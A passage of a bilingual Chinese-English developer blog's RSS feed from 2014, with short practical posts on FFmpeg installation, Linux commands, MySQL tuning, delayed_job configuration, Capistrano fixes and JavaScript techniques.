&lt;p&gt;You can tell your shell (assuming you're using Bash) to persistantly use your new ffmpeg in ~/bin. The first command will allow you to simply run man ffmpeg to get the FFmpeg man pages. The second command will source ~/.profile which will add ~/bin to your $PATH. In short, the following commands will allow you to simply type ffmpeg and man ffmpeg in your terminal and they will "just work":&lt;/p&gt;
&lt;p&gt;echo "MANPATH_MAP $HOME/bin $HOME/ffmpeg_build/share/man" &amp;gt;&amp;gt; ~/.manpath&lt;br /&gt;. ~/.profile&lt;br /&gt;Note:&lt;/p&gt;
&lt;p&gt;This may reset custom variables in the current shell session.&lt;br /&gt;This assumes you are using the default ~/.profile (and therefore ~/.bashrc).&lt;br /&gt;This assumes you are using Bash shell.&lt;br /&gt;Sourcing the default ~/.profile will also source ~/.bashrc.&lt;br /&gt;You may have to log out and then log in for man ffmpeg to work.&lt;br /&gt;Don't worry: you can undo any of this as shown in Reverting Changes Made by This Guide.&lt;br /&gt;See ​Ubuntu Wiki: Persistent Environment Variables for more info.&lt;/p&gt;
&lt;p&gt;Additional Notes&lt;/p&gt;
&lt;p&gt;See the x264 Encoding Guide for some encoding examples.&lt;br /&gt;If you do not see FFmpeg developers in your ffmpeg console output then something went wrong and you're probably using the ​fake "ffmpeg" from the repository.&lt;br /&gt;HTML formatted documentation is available in ~/ffmpeg_build/share/doc/ffmpeg.&lt;br /&gt;You can keep the ffmpeg_sources directory if you plan on updating later. See Updating FFmpeg below for more details followed by instructions for reverting all changes made by this guide.&lt;br /&gt;Updating FFmpeg&lt;/p&gt;
&lt;p&gt;Development of FFmpeg is active and an occasional update can give you new features and bug fixes. First you need to delete (or move) the old files:&lt;/p&gt;
&lt;p&gt;rm -rf ~/ffmpeg_build ~/ffmpeg_sources ~/bin/{ffmpeg,ffprobe,ffserver,vsyasm,x264,yasm,ytasm}&lt;br /&gt;Now just follow the guide from the beginning.&lt;/p&gt;
&lt;p&gt;Reverting Changes Made by This Guide&lt;/p&gt;
&lt;p&gt;rm -rf ~/ffmpeg_build ~/ffmpeg_sources ~/bin/{ffmpeg,ffprobe,ffserver,vsyasm,x264,yasm,ytasm}&lt;br /&gt;sudo apt-get autoremove autoconf automake build-essential libass-dev libfreetype6-dev libgpac-dev \&lt;br /&gt;  libmp3lame-dev libopus-dev libsdl1.2-dev libtheora-dev libtool libva-dev libvdpau-dev \&lt;br /&gt;  libvorbis-dev libvpx-dev libx11-dev libxext-dev libxfixes-dev texi2html zlib1g-dev&lt;br /&gt;sed -i '/ffmpeg_build/c\' ~/.manpath&lt;br /&gt;hash -r&lt;/p&gt;</description>
      <pubDate>Fri, 20 Jun 2014 07:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-ffmpeg-on-ubuntu12-13</link>
    </item>
    <item>
      <title>无法安装node的解决办法（how to install node in centos 5.8 )</title>
      <description>&lt;p&gt;最近遇到的问题是： 在一个centos 5.8的机器上无法使用node. 无论是下载node 32位还是64位安装包都不行。提示说： unable to execute...（同32位机器上运行64位的程序一样）&amp;#160;&lt;/p&gt;
&lt;p&gt;解决方案： 下载node source , 编译安装。 &amp;#160;(solution: &amp;#160;download the source file and then compile it~ )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 20 Jun 2014 05:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-node-on-centos</link>
    </item>
    <item>
      <title>查看下载服务器情况（how to check your download server status) </title>
      <description>&lt;p&gt;今天早上接到服务器报警，所以有几个办法：&lt;/p&gt;
&lt;p&gt;1. $ iptraf 命令。 选择general interface statistics ， &amp;#160; 在 activity 一栏中可以看到传出数据的流量/s. &amp;#160;如图。&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNi8yMC8xMF80Nl8xNl81MjhfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDZfMjBfMTBfNDRfNTQucG5nBjoGRVQ/Screenshot%20from%202014-06-20%2010png:54.:ext" title="Screenshot From 2014 06 20 10:44:54" alt="Screenshot From 2014 06 20 10:44:54" rel="225x255" width="1280.1818182468414" height="800.1818182468414" /&gt;&lt;/p&gt;
&lt;p&gt;2. 查看nginx 日志。 &amp;#160;看看哪些资源被请求的多。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 20 Jun 2014 02:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-check-download-server-status</link>
    </item>
    <item>
      <title>回忆陈老大昨天的讲话</title>
      <description>&lt;p&gt;昨天陈老大给我们上了一课。 &amp;#160;关于移动APP的发展。 从心理学，社会学，各种文化领域做了分析。&amp;#160;&lt;/p&gt;
&lt;p&gt;收获很大！ 总结的话，就一点:&lt;/p&gt;
&lt;p&gt;吸引用户。让用户觉得你有用。离不开。&amp;#160;&lt;/p&gt;
&lt;p&gt;逼格？ 90后？&amp;#160;&lt;/p&gt;
&lt;p&gt;一个大男人穿着有姨妈巾的内裤睡觉3个月。。。这个精神。。。&lt;/p&gt;</description>
      <pubDate>Thu, 19 Jun 2014 15:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/a-lesson-from-big-boss</link>
    </item>
    <item>
      <title>无法部署capistrano ( Capistrano cannot deploy code, because Net::SSH::AuthenticationFailed: Authentication failed ) </title>
      <description>&lt;p&gt;solution: &amp;#160;&lt;/p&gt;
&lt;p&gt;# add to Gemfile:&amp;#160;&lt;/p&gt;
&lt;p&gt;gem 'net-ssh', '2.7.0' &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;done.&amp;#160;&lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/questions/21811026/capistrano-cannot-deploy-code-because-netsshauthenticationfailed-authentic" target="_blank"&gt;http://stackoverflow.com/questions/21811026/capistrano-cannot-deploy-code-because-netsshauthenticationfailed-authentic&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Thu, 19 Jun 2014 08:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/capstrano-failed-because-of-net-ssh-authentication-failed</link>
    </item>
    <item>
      <title>linux set datetime (linux 下设置时间）</title>
      <description>&lt;p&gt;# date --set="26 Nov 2012 18:00:00"&lt;/p&gt;</description>
      <pubDate>Mon, 16 Jun 2014 09:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/set-date-under-linux</link>
    </item>
    <item>
      <title>使用top命令时按模式查看命令(patterns for name when using top command) </title>
      <description>&lt;p&gt;$ top -d 1 -p `pgrep -d, ruby`&lt;/p&gt;
&lt;p&gt;上面的命令只查看当前系统中 的'ruby' 进程。&lt;/p&gt;</description>
      <pubDate>Fri, 13 Jun 2014 07:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/advanced-top-command</link>
    </item>
    <item>
      <title>动态的声明JS 方法（define functions in javascript dynamically ) </title>
      <description>&lt;p&gt; 下面的代码是不是看起来很可恶？  (isn't it too smelly? )&lt;/p&gt;
&lt;pre&gt;restart_services_animation = function(){
  high_light_link_on_right_menu('services')
  if($('#services_animation_is_showing').length &amp;gt; 0 || $('#services_animation_is_shown').length &amp;lt; 1) {
    return;
  }
  cancel_services_animation()
  start_services_animation()
}

restart_cases_animation = function(){
  high_light_link_on_right_menu('cases')
  if($('#cases_animation_is_showing').length &amp;gt; 0 || $('#cases_animation_is_shown').length &amp;lt; 1) {
    return;
  }
  cancel_cases_animation()
  start_cases_animation()
}
&lt;/pre&gt;

&lt;p&gt; 动态的声明 它们：  ( dynamically define functions as below) &lt;/p&gt;
&lt;pre&gt;// 这里是动态的方法声明和调用。 声明以下四个方法：
// restart_index_animation()
// restart_services_animation()
// restart_cases_animation()
// restart_about_us_animation()
$(['index', 'services', 'cases', 'about_us']).each(function(i,e){
  window['restart_' + e + '_animation'] = function() {
    high_light_link_on_right_menu( e )
    if($('#' + e + '_animation_is_showing').length &amp;gt; 0 ||
        $('#' + e + '_animation_is_shown').length &amp;lt; 1) {
      return;
    }
    // 动态的方法调用，例如： cancel_services_animation()
    window['cancel_'+e+'_animation']()
    // 动态的方法调用，例如： start_services_animation()
    window['start_' + e + '_animation']()
  }
})&lt;/pre&gt;
&lt;p&gt;see: &lt;a target="_blank" href="http://stackoverflow.com/questions/8309242/how-to-dynamically-build-a-function-in-javascript"&gt;http://stackoverflow.com/questions/8309242/how-to-dynamically-build-a-function-in-javascript&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Thu, 12 Jun 2014 11:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/define-functions-in-javascript-dynamically</link>
    </item>
    <item>
      <title>jquery animation的一种实现模式 ( an implementation of jquery animation) </title>
      <description>&lt;p&gt;我们在页面中，总是要对某些元素的展示作出动画效果。&amp;#160;&lt;/p&gt;
&lt;p&gt;经过实践，我们发现，最好不要在页面的初始化时就设置好某个元素的位置。 而是需要&lt;br /&gt;1. 把它保留原有的元素位置不动。&amp;#160;&lt;br /&gt;2. 使用 jquery.css() 方法设置目标的 初始化位置&lt;br /&gt;3. 使用 jquery.animation() 方法 将目标的位置变回来。&amp;#160;&lt;/p&gt;
&lt;p&gt;例如： 
&lt;/p&gt;
&lt;pre&gt;  // 正确的办法： 使用JS 先把目标元素设置个偏移量，然后再把它移动回来。
               $('#' + id_selector).children('img').last()
                 .css('margin-left', '+=50px')
                 .animate({ opacity: 1.0, 'margin-left': '-=50' }, 1000, after_call_back )
&lt;/pre&gt;
&lt;p&gt;see:&amp;#160;https://github.com/sg552/test_animation/blob/master/animation.js&lt;/p&gt;
</description>
      <pubDate>Thu, 12 Jun 2014 11:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/an-implementation-of-jquery-animation</link>
    </item>
    <item>
      <title>mongodb export/import v.s. dump/restore </title>
      <description>&lt;p&gt;In contrast, use import and export tools to backup a small subset of your data or to move data to or from a third party system.&lt;/p&gt;
&lt;p&gt;mongodump&lt;br /&gt;Export MongoDB data to BSON files.&lt;/p&gt;</description>
      <pubDate>Thu, 12 Jun 2014 09:36:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mongodb-export-import-vs-dump-restore</link>
    </item>
    <item>
      <title>在IE8下调整IE6,IE7的样式 ( adjusting IE6/7 using IE8 developer tool) </title>
      <description>&lt;p&gt;1. 使用IE8打开对应的HTML 页面（ using IE8 open HTML file)&lt;/p&gt;
&lt;p&gt;2. 按F12. 就可以跟在 chrome中一样操作（ press F12 to open the developer tool)&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 选择 quirk modes/standard modes 就可以分别做调整。 ( choosing quirk/standark modes to debug)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 12 Jun 2014 02:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/adjusting-ie-browser-using-ie8</link>
    </item>
    <item>
      <title>一种看迅雷电影的方式</title>
      <description>&lt;p&gt;1. 登录迅雷云空间 （lixian.xunlei.com)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 下载任务到云空间&lt;/p&gt;
&lt;p&gt;3. 在线播放。 哦也！&lt;/p&gt;
&lt;p&gt;我会说正在看 《普罗米修斯》？ ^_^&lt;/p&gt;</description>
      <pubDate>Sat, 07 Jun 2014 13:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/watch-xunlei-in-linux</link>
    </item>
    <item>
      <title>再谈一种 bad code smell</title>
      <description>&lt;p&gt;在 微信的“接入指南”中 (&lt;a href="http://mp.weixin.qq.com/wiki/index.php?title=%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97"&gt;http://mp.weixin.qq.com/wiki/index.php?title=%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97&lt;/a&gt;：&lt;/p&gt;

&lt;pre&gt;private function checkSignature()
{
       // .....
	
	if( $tmpStr == $signature ){
		return true;
	}else{
		return false;
	}
}
&lt;/pre&gt;
&lt;p&gt;直接写成这样是不是更好？ &amp;#160;( it isn't this a better implementation ? )&amp;#160;&lt;/p&gt;
&lt;pre&gt;private function checkSignature()
{
       // .....
	return $tmpStr == $signature
}
&lt;/pre&gt;
&lt;p&gt;我对PHP 不懂，如果真的是可以的话，我在想腾讯的PHP er们是不是可以改进下文档？&lt;/p&gt;</description>
      <pubDate>Sat, 07 Jun 2014 08:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/another-bad-code-smell</link>
    </item>
    <item>
      <title>动态调用JS方法的几种方法 (dynamically call js funtions) </title>
      <description>&lt;pre&gt;say_hi =function(){
  alert('hi')
}
&lt;/pre&gt;

&lt;p&gt;# refer to: http://stackoverflow.com/questions/969743/how-do-i-call-a-dynamically-named-method-in-javascript&lt;br /&gt;1. window['say_hi']()  #global method&lt;/p&gt;
&lt;p&gt;# refer to : http://stackoverflow.com/questions/15202942/javascript-dynamic-function-call-with-name&lt;br /&gt;2. this['say_hi']()  # defined in some namespace&lt;/p&gt;
&lt;p&gt;# http://viralpatel.net/blogs/calling-javascript-function-from-string/&lt;br /&gt;3. eval("say_hi()")&lt;/p&gt;</description>
      <pubDate>Fri, 06 Jun 2014 04:37:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/dynamically-call-javascript-functions</link>
    </item>
    <item>
      <title>convert RGB to hex colors using gimp (使用gimp把rgb格式的颜色转换成 hex 格式)</title>
      <description>&lt;p&gt;1. 点击颜色板 (click the color panel )&lt;/p&gt;
&lt;p&gt;2. 在 R。G。B中分别输入数值 (input R.G.B)&lt;/p&gt;
&lt;p&gt;3. HTML notation中就可以看到HEX值了。 ( see the HTML notation for the hex value)&amp;#160;&lt;/p&gt;
&lt;div&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNi8wNi8wN180NV8yM183MjJfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDZfMDZfMDdfNDBfMTIucG5nBjoGRVQ/Screenshot%20from%202014-06-06%2007png:12.:ext" title="Screenshot From 2014 06 06 07:40:12" alt="Screenshot From 2014 06 06 07:40:12" rel="225x255" width="1280.1818182468414" height="800.1818182468414" /&gt;&lt;/div&gt;</description>
      <pubDate>Thu, 05 Jun 2014 23:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/convert-rgb-to-hex-colors-using-gimp</link>
    </item>
    <item>
      <title>httparty使用 timeout (using timeout in httparty) </title>
      <description>an example: 

&lt;pre&gt;  1 # -*- encoding : utf-8 -*-
  2 class StaticFilesController &amp;lt; ApplicationController
  3   include HTTParty
  4   default_timeout 3
 11   
 12   def get_generator_plans
 13     self.class.get 'some/url'
 14   end
 15 end

&lt;/pre&gt;</description>
      <pubDate>Tue, 03 Jun 2014 01:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-timeout-in-httparty</link>
    </item>
    <item>
      <title>删除7天前的文件  ( delete files older than 7 days ago ) </title>
      <description>&lt;p&gt;$ find . -type f -mtime +7 -delete&lt;/p&gt;
&lt;p&gt;$ find . -name '*.log' -mtime +7 -delete &lt;/p&gt;
&lt;p&gt;refer to : &lt;a href="http://www.abestweb.com/forums/programming-datafeeds-tools-188/help-how-delete-files-before-certain-date-linux-64662.html" target="_blank"&gt;http://www.abestweb.com/forums/programming-datafeeds-tools-188/help-how-delete-files-before-certain-date-linux-64662.html&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 27 May 2014 02:53:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/delete-files-certain-days-ago</link>
    </item>
    <item>
      <title>greplace 详解 (vim plugin greplace introduction) </title>
      <description>&lt;p&gt;greplace 是VIM程序员必备技能，可以帮我们批量查询和替换。&lt;/p&gt;
&lt;p&gt;例如，查找当前 目录下的所有rb文件中的 'prefix' ：&lt;/p&gt;
&lt;pre&gt;# notice the "." before "-R'
:Gsearch -F 'prefix' . -R  --include=*rb   

  2 # Modify the contents of this buffer and then
  3 # use the ":Greplace" command to merge the changes.
  4 #
  5 app/helpers/target_url_helper.rb:6:      Settings.static_files.folder_prefix, plan.folder_name
  6 app/models/target_url.rb:31:    folder_prefix = Rails.env=='test' ?
  7 app/models/target_url.rb:32:      Settings.static_files.folder_prefix_for_unit_test :

在上面的文件，使用 %s 做完替换后， 
:Greplace 
就可以了。
最后 
:wa 
保存所有的改动。
&lt;/pre&gt;</description>
      <pubDate>Tue, 27 May 2014 02:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/vim-plugin-greplace</link>
    </item>
    <item>
      <title>install ssh-server on ubuntu</title>
      <description>&lt;p&gt;$&amp;#160;sudo apt-get install openssh-server&lt;/p&gt;
&lt;p&gt;$ sudo start/stop ssh&lt;/p&gt;</description>
      <pubDate>Tue, 27 May 2014 00:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-ssh-server-on-ubuntu</link>
    </item>
    <item>
      <title>thin + rackup + yml的启动方式 ( thin + config.ru + thin.yml )</title>
      <description>&lt;p&gt;对于ruby-cas, 我们目前使用的方式是 &amp;#160;thin + config.ru ： &amp;#160;( currently , we are using ruby-cas (rack) + thin )&lt;/p&gt;
&lt;p&gt; 当前的启动方式是：  (已经存在的config.ru 文件如下 ) &amp;#160;( current start command is as below: )&lt;/p&gt;
&lt;p&gt;$ bundle exec thin start -R config.ru -p 3535 -e production -d &lt;/p&gt;
&lt;pre&gt;  # config.ru
require 'rubygems'
require 'bundler/setup'

$:.unshift "#{File.dirname(__FILE__)}/lib"
require "casserver"

use Rack::ShowExceptions
use Rack::Runtime
use Rack::CommonLogger

run CASServer::Server.new

&lt;/pre&gt;

&lt;p&gt;1. 命令行： &amp;#160; ( so , this is the command line )&amp;#160;&lt;/p&gt;
&lt;p&gt;$ bundle exec thin start -R config.ru -p 3535 -e production -d&lt;/p&gt;
&lt;p&gt;2. 如果要启动多个服务器呢？  （启动3535， 3536 两个端口） &amp;#160;( this is how to start multiple servers in one command)&amp;#160;&lt;/p&gt;
&lt;p&gt;$ bundle exec thin start -R config.ru -p 3535 -e production -d -s 2 &lt;/p&gt;
&lt;p&gt;3. 使用 config.yml 的方式：  $ bundle exec thin start -C thin.yml &amp;#160; ( start servers using config.yml file)&amp;#160;&lt;/p&gt;
&lt;pre&gt;---
chdir: /opt/app/ruby/m-cas
environment: production
address: 0.0.0.0
port: 3501
timeout: 30
log: log/thin.log
pid: tmp/pids/thin.pid
rackup: config.ru    # &amp;lt; ==  NOTICE this. 
max_conns: 1024
max_persistent_conns: 512 
require: []
wait: 5
servers: 8
daemonize: true

&lt;/pre&gt;
</description>
      <pubDate>Mon, 26 May 2014 00:51:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/thin-config-ru-thin-yml</link>
    </item>
    <item>
      <title>why delayed_job's priority is: lower is more imporant ? (为什么delayed_job的priority是数字越小越重要？）</title>
      <description>&lt;p&gt;delayed_job有两个分支，一个是 &amp;#160;collectiveidea的(https://github.com/collectiveidea/delayed_job/wiki, priority越小越重要），一个是 tobi的(https://github.com/tobi/delayed_job 已经不再维护) ;&lt;/p&gt;
&lt;p&gt;今天用delayed_job生成了 5W个子任务，然后发现任务进行的很慢：&amp;#160;&lt;/p&gt;
&lt;p&gt;mysql一直是占用150%的CPU&lt;/p&gt;
&lt;p&gt;每秒 最多处理10个任务，而不是5K左右job下的 30job/s. &amp;#160;&lt;/p&gt;
&lt;p&gt;考虑了很久查看了slow_query, 发现有时候一个update需要耗时 6秒以上。而且发现了这个文章：
&lt;a href="http://www.elevatedcode.com/2009/11/04/speeding-up-delayed-job.html" target="_blank"&gt;http://www.elevatedcode.com/2009/11/04/speeding-up-delayed-job.html&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;总结了一下，原来在大数据量下面， 问题的瓶颈在于一个查询，这个 查询的优化方式是需要对两个列进行排序的索引：&lt;/p&gt;
&lt;p&gt;" ... where .... &amp;#160;order by priority desc, run_at asc "&amp;#160;&lt;/p&gt;
&lt;p&gt;而对于一般的数据库来说（例如最常见的MYSQL），他可以进行两个column的组合索引，但是结果是 "priority asc, run_at asc"， 而不是 "priority desc, run_at asc" (据说oracle可以这样做） &amp;#160;&lt;/p&gt;
&lt;p&gt;所以，解决的办法是：&lt;/p&gt;
&lt;p&gt;1. 对priority + run_at 增加组合索引&lt;/p&gt;
&lt;p&gt;2. 对 priority 越小越重要，这样就可以写出: &amp;#160;"... order by priority asc, run_at asc"&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 22 May 2014 08:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/why-delayed-job-priority-lower-is-more-important</link>
    </item>
    <item>
      <title>optimize Mysql config( 优化MYSQL）</title>
      <description>&lt;p&gt;最近在MYSQL上跑了一组 delayed_job, 发现有问题： 同时开始6个worker时 MYSQL 的CPU使用率就占到了150%. &amp;#160;( I found the 'mysql process' costing 150% cpu time when running a group of delayed_jobs -- about 10 workers , so I decide to optimize it)&lt;/p&gt;
&lt;p&gt;优化方式： 先看看目前的各种数据： ( before the optimization, let me check its status: )&amp;#160;&lt;/p&gt;
&lt;pre&gt;mysql&amp;gt; show variables like '%query_cache%';
+------------------------------+---------+
| Variable_name                | Value   |
+------------------------------+---------+
| have_query_cache             | YES     | 
| query_cache_limit            | 1048576 | 
| query_cache_min_res_unit     | 4096    | 
| query_cache_size             | 0       | 
| query_cache_type             | ON      | 
| query_cache_wlock_invalidate | OFF     | 
+------------------------------+---------+
6 rows in set (0.00 sec)

&lt;/pre&gt;
&lt;p&gt;可以看到， 基本没有任何优化， query_cache_size 居然是0， 我无了个语。。。 &amp;#160; 果断修改 mysql 配置（ $ vim /etc/my.conf ) &amp;#160; ( see? &amp;#160;the query_cache_size = 0.... oh my god... )&amp;#160;&lt;/p&gt;
&lt;pre&gt;[mysqld]
#  other items... 
query_cache_limit = 128M
query_cache_size = 512M

&lt;/pre&gt;
&lt;p&gt;哦也！ &amp;#160; &amp;#160;( now it works very well under pressure! )&amp;#160;&lt;/p&gt;
&lt;p&gt;p.s. 其他命令：&lt;/p&gt;
&lt;p&gt;$ show processlist;&lt;/p&gt;
&lt;p&gt;$ show index from &amp;lt;table&amp;gt;;&lt;/p&gt;
&lt;p&gt;$ check slow_log: $ tail /var/log/&amp;lt;log_file&amp;gt; -f&lt;/p&gt;</description>
      <pubDate>Thu, 22 May 2014 05:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mysql-optimization</link>
    </item>
    <item>
      <title>jquery.shorten的使用中无法出现'...'的问题 (no ellipse text when using jquery.shorten?)</title>
      <description>&lt;p&gt;比如，一段文字过长，使用了 jquery.shorten之后，没有出现 ...? &amp;#160; &amp;#160; ( your long wrapped text is not ended with ellipse text? )&amp;#160;&lt;/p&gt;
&lt;p&gt;原文(original long text) ： &amp;#160;"I love you so so so so so much!"&lt;/p&gt;
&lt;p&gt;expected: "I love you ..."&lt;br /&gt;but it may be "I love you" &amp;#160;( ellipse text missing)&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法： &amp;#160;记得长文字前后要用&amp;lt;p&amp;gt; 给包围起来，例如： &amp;#160;(solution: wrap the long text with a HTML tag)&amp;#160;&lt;/p&gt;
&lt;pre&gt;&amp;lt;div&amp;gt;  I love you so so so so so much! &amp;lt;/div&amp;gt;
should be:
&amp;lt;div&amp;gt;
  &amp;lt;p&amp;gt;  I love you so so so so so much! &amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/pre&gt;</description>
      <pubDate>Mon, 19 May 2014 02:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/no-ellipse-text-using-jquery-shorten</link>
    </item>
    <item>
      <title>delayed_job: max_run_time 一定不要设定过短 ( max_run_time should be shorter than any kind of job )</title>
      <description>&lt;p&gt;今天被这个问题搞死了。 ( I am almost beaten by this issue today)&amp;#160;&lt;/p&gt;
&lt;p&gt;有两种JOB: 一种是父JOB， 专门生成子job. 一种是 "子job" &amp;#160;( I have 2 kinds of job: spawner job which generates normal jobs, normal job)&lt;/p&gt;
&lt;p&gt;前者 耗时比较久， 5分钟左右， 后者3秒以内。 ( the spawner lasts minutes, and normal jobs last less than 3 seconds)&amp;#160;&lt;/p&gt;
&lt;p&gt;今天发现的问题是： &amp;#160;父JOB正常来说应该只运行一次，结果发现它会运行2～3次不等。 ( today I found that spawner job always run more than I time)&amp;#160;&lt;/p&gt;
&lt;p&gt;弄了3个小时以后才发现问题： &amp;#160;配置 中的 max_run_time 太短了，导致每次delayed_job 都以为正常运行的父JOB失败了呢。结果第二个WORKER就开始工作了。。。 ( after 3 hours I found the root cause: I set max_run_time too short ( 1 minute ))&lt;/p&gt;
&lt;pre&gt;  ( 看到了吗？ 每次都差1分钟）
sg552@youku:/sg552/workspace/m-cms-static-page-generator/log$ grep 'generating' delayed_job_2014-05-18.log 
16:42:25 INFO: == a plan is generating 1512 files/jobs 
16:43:26 INFO: == a plan is generating 1512 files/jobs 
&lt;/pre&gt;

&lt;p&gt;解决办法： 增加 max_run_time, 让它不短于任何一种job: &amp;#160; ( solution is: increase the "max_run_time" option to make it longer than any job)&amp;#160;&lt;/p&gt;
&lt;pre&gt; (修改 max_run_time )
# -*- encoding : utf-8 -*-
# config/initializers/delayed_job_config.rb
Delayed::Worker.destroy_failed_jobs = false
Delayed::Worker.sleep_delay = 10
Delayed::Worker.max_attempts = 5 
Delayed::Worker.max_run_time = 30.minutes  
Delayed::Worker.read_ahead = 10
Delayed::Worker.default_queue_name = 'default'
&lt;/pre&gt;</description>
      <pubDate>Sun, 18 May 2014 08:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/max_run_time-should-be-set-properly</link>
    </item>
    <item>
      <title>linux 下查看 某个process 的所在位置（ find out which folder a process is running from)</title>
      <description>&lt;p&gt;$ ls -l /proc/22503/cwd &amp;#160; &amp;#160;( 22503 is your proccess id )&lt;/p&gt;
&lt;p&gt;就是这么简单（so easy! )&amp;#160;&lt;/p&gt;
&lt;p&gt;感谢 沛沛  (&lt;a href="http://www.hanpeipei.com/"&gt;http://www.hanpeipei.com/ &lt;/a&gt;) 告诉我这个技巧。&lt;/p&gt;</description>
      <pubDate>Sun, 18 May 2014 02:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/find-out-which-folder-process-is-running-from</link>
    </item>
    <item>
      <title>路由器太久没重启也会导致VPN连不上！ ( restart your LAN to connect VPN)</title>
      <description>&lt;p&gt;如题！！！ &amp;#160;太坑跌了！！！ &amp;#160;我差点就赶回 公司了！！！&lt;/p&gt;
&lt;p&gt;重启霞路由器，两个电脑都能脸上了!!!!! &amp;#160; 得救了！&lt;/p&gt;</description>
      <pubDate>Fri, 16 May 2014 13:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/restart-router-to-connect-vpn</link>
    </item>
    <item>
      <title>写个  delayed_job 的 process monitor </title>
      <description>&lt;p&gt;虽然官方网站已经有了几个开源的项目，但是我个人觉得用不上啊。先记录在这里好了。&amp;#160;&lt;/p&gt;
&lt;p&gt; 78   def update_delayed_job&lt;br /&gt; 79     CmsDelayedJobForClient.delete_all("handler like '%#{self.class}%id: #{self.id}\\n%'")&lt;br /&gt; 80     Delayed::Job.enqueue(ScheduledOnlineJob.new(self), :run_at =&amp;gt; self.begin_at) if begin_at.p&lt;br /&gt; 81     Delayed::Job.enqueue(ScheduledOfflineJob.new(self), :run_at =&amp;gt; self.end_at) if end_at.pres&lt;br /&gt; 82   end&lt;br /&gt;&lt;/p&gt;</description>
      <pubDate>Wed, 14 May 2014 07:14:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/delayed_job-process-monitor</link>
    </item>
    <item>
      <title>在iframe中使用 a link到别的站点( a link jump from current iframe to another site) </title>
      <description>&lt;p&gt;原始的错误是：&amp;#160;Overcoming “Display forbidden by X-Frame-Options”&lt;/p&gt;
&lt;p&gt;解决办法： &amp;#160; &amp;#160;&amp;lt;a href='anothersite.com/aaabbbccc.html' target="_top"&amp;gt; some other site url &amp;lt;/a&amp;gt;&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 14 May 2014 05:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/a-link-to-another-site-from-iframe</link>
    </item>
    <item>
      <title>做个有意思的统计： 垃圾回复的特点： ( key features of the spam comments ) </title>
      <description>&lt;p&gt;不经意之间，我的个人博客居然有1000+ 回复（2周内吧）， 看了下，99.9% 都是垃圾恢复。特点都是：&lt;/p&gt;
&lt;p&gt;1. 内容中带有： href&lt;/p&gt;
&lt;p&gt;2. http://&lt;/p&gt;
&lt;p&gt;3. https://&lt;/p&gt;
&lt;p&gt;直接干掉没商量 。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 13 May 2014 01:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/features-of-spam-comments</link>
    </item>
    <item>
      <title>delayed_job + god 组合使用  ( using delayed_job with god ) </title>
      <description>&lt;p&gt;项目中用到了delayed_job 这个神器。 &amp;#160;缺点是它有时候自己遇到 mysql_connection_error 就会关掉。 &amp;#160;( my project heavily used delayed_job, and we found it will stop if met some error or exceptions. and I want to restart it via web GUI http request )&amp;#160;&lt;/p&gt;
&lt;p&gt;于是我想到用god来控制它。 &amp;#160;( so it's time to use GOD (http://godrb.com )&amp;#160;&lt;/p&gt;
&lt;p&gt;god 的脚本针对两种进程： 一种是普通的进程， 一种是daemon进程。 &amp;#160;delayed_job的脚本运行后，是daemon进程，所以它的god配置文件就略有不同（ 注意其中的pid 属性） &amp;#160; ( there are 2 kind of processes in god: &amp;#160;normal , daemon . so the config files are different. below is the daemon config file, notice its "pid" segment )&lt;/p&gt;
&lt;pre&gt;# 使用方法：
# 1. 修改 RAILS_ROOT
# 2. 修改 start 命令和 log 日志的地点
# 3. 调试时，记得有4分钟的延迟时间。不要问为什么delay_job脚本启动了但是SQL中仍然有JOB记录。
# 4. 而且 delayed_job 有自己的 sleep_time, 默认是60秒。
